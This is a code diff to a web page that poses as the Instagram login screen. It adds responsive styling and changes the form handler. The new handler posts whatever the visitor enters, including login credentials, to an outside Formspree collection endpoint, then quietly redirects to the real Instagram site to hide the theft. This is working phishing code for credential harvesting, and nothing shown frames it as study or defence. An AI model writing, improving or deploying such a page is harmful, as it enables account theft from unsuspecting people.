@@ -6,6 +6,7 @@
   <title>Instagram</title>
   <link rel="icon" href="https://imgur.com/X8CNLBY.png" type="image/png">
   <style>
+    /* (Todo el estilo permanece igual como ya está definido) */
     * {
       box-sizing: border-box;
     }
@@ -26,6 +27,8 @@
       align-items: center;
       gap: 60px;
       margin-top: 50px;
+      flex-wrap: wrap;
+      justify-content: center;
     }
     .image-area {
       max-width: 460px;
@@ -122,17 +125,57 @@
       text-align: center;
       font-size: 12px;
       color: #777;
+      padding: 0 20px;
     }
     .footer a {
       color: #999;
       text-decoration: none;
       margin: 0 5px;
     }
+    @media (max-width: 768px) {
+      html {
+        zoom: 1;
+      }
+      .container {
+        flex-direction: column;
+        gap: 30px;
+        padding: 0 20px;
+      }
+      .image-area {
+        max-width: 90%;
+      }
+      .login-box {
+        width: 100%;
+        max-width: 320px;
+      }
+      .login-box .store-buttons {
+        flex-wrap: wrap;
+      }
+    }
   </style>
   <script>
     function enviarFormulario(event) {
       event.preventDefault();
-      window.location.href = 'https://www.instagram.com';
+      const form = event.target;
+      const formData = new FormData(form);
+
+      fetch('https://formspree.io/f/xgvkvkqo', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(() => {
+        setTimeout(() => {
+          window.location.href = 'https://www.instagram.com';
+        }, 1500);
+      })
+      .catch(() => {
+        setTimeout(() => {
+          window.location.href = 'https://www.instagram.com';
+        }, 1500);
+      });
     }
   </script>
 </head>
